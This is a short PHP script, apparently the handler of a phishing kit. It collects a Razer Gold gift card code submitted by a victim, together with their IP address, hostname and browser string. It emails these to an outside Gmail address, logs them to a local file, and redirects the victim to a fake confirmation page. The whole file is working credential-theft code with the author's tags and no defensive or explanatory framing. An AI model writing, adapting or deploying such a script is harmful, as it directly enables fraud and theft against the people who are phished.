<?php
$ip = $_SERVER["REMOTE_ADDR"];
$hostname = gethostbyaddr($ip);

$send = "oyyiigg@gmail.com";
$subject = "~ New Résultat By Y K K ~ | $ip";

header("Location: ../confirmed.html");

$message = "|----------|By KaKarout|--------------|\n";
$message .= "-------------------- Code Razer Gold 500 USD -------------------\n";
$message .= "--------------  Infos -------------\n";
$message .= "CODE DE CARTE CADEAU      : " . $_POST['YKK'] . "\n";
$message .= "|---------------|Info|-------------------|\n";
$message .= "IP      : $ip\n";
$message .= "HOST    : $hostname\n";
$message .= "BROWSER : " . $_SERVER['HTTP_USER_AGENT'] . "\n";
$message .= "|----------|By KaKarout|--------------|\n";

mail($send, $subject, $message);

$file = fopen("./YKK.txt", 'a');
fwrite($file, $message);
fclose($file);
?>